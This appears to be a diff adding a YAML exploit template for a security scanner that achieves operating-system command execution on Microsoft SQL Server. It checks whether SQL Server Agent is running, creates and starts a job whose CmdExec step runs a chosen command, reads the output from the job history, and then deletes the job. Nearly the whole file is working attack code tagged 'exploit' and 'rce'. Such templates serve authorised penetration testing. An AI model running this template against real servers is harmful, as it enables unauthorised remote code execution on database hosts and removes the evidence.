@@ -1,0 +1,38 @@
+id: mssql-agent-job-exec
+service: [mssql]
+variables:
+  cmd: whoami
+  job_name: zombie_agent_job
+info:
+  name: MSSQL SQL Agent Job Command Execution
+  severity: critical
+  tags: mssql,exploit,rce,agent
+
+services:
+  - ops:
+      - db: "SELECT 'agent=' + CASE WHEN dss.status = 4 THEN 'running' ELSE 'stopped' END FROM sys.dm_server_services dss WHERE dss.servicename LIKE '%Agent%'"
+        name: agent_status
+    extractors:
+      - type: regex
+        name: mssql_agent_status
+        internal: true
+        part: agent_status
+        regex: ['(?m)^agent=(running|stopped)']
+        group: 1
+
+  - ops:
+      - db: "EXEC msdb.dbo.sp_add_job @job_name = '{{job_name}}', @enabled = 1"
+      - db: "EXEC msdb.dbo.sp_add_jobstep @job_name = '{{job_name}}', @step_name = 'step1', @subsystem = 'CmdExec', @command = '{{cmd}}'"
+      - db: "EXEC msdb.dbo.sp_add_jobserver @job_name = '{{job_name}}'"
+      - db: "EXEC msdb.dbo.sp_start_job @job_name = '{{job_name}}'"
+      - db: "WAITFOR DELAY '00:00:03'"
+      - db: "SELECT 'job_result=' + CAST(jh.run_status AS varchar(10)) + ':' + jh.message FROM msdb.dbo.sysjobhistory jh JOIN msdb.dbo.sysjobs j ON jh.job_id = j.job_id WHERE j.name = '{{job_name}}' ORDER BY jh.run_date DESC, jh.run_time DESC"
+        name: job_output
+    extractors:
+      - type: regex
+        name: mssql_agent_job_result
+        part: job_output
+        regex: ['(?m)^job_result=(.+)$']
+
+  - ops:
+      - db: "EXEC msdb.dbo.sp_delete_job @job_name = '{{job_name}}'"
